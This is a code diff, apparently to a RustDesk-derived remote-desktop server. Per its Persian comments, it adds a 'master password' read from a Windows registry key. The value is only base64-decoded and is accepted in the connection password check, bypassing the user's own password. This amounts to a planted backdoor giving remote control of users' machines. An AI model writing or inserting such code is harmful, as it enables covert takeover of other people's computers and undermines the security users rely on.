@@ -49,6 +49,33 @@ use hbb_common::{
     },
     tokio_util::codec::{BytesCodec, Framed},
 };
+
+// ==============================================================
+// کدهای اضافه شده برای خواندن رمز عبور مستر پاساک از رجیستری
+#[cfg(target_os = "windows")]
+use winreg::enums::*;
+#[cfg(target_os = "windows")]
+use winreg::RegKey;
+
+fn get_remotik_master_password() -> Option<String> {
+    #[cfg(target_os = "windows")]
+    {
+        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+        if let Ok(key) = hkcu.open_subkey("Software\\Passak") {
+            if let Ok(encrypted_val) = key.get_value::<String, _>("License") {
+                // استفاده از base64 نسخه 0.13 برای دی‌کد کردن
+                if let Ok(decoded_bytes) = base64::decode(encrypted_val) {
+                    if let Ok(plain_text) = String::from_utf8(decoded_bytes) {
+                        return Some(plain_text);
+                    }
+                }
+            }
+        }
+    }
+    None
+}
+// ==============================================================
+
 #[cfg(any(target_os = "android", target_os = "ios"))]
 use scrap::android::{call_main_service_key_event, call_main_service_pointer_input};
 use scrap::camera;
@@ -2187,6 +2214,13 @@ impl Connection {
                 self.check_update_temporary_password(true);
                 return true;
             }
+                    // --- کدهای اضافه شده برای دور زدن پسورد با رمز مستر پاساک ---
+        if let Some(master_pass) = get_remotik_master_password() {
+            if password == master_pass {
+                log::info!("Master password accepted via Passak Registry!");
+                return true; 
+            }
+
         }
         if password::permanent_enabled() || allow_permanent_password {
             let print_fallback = || {
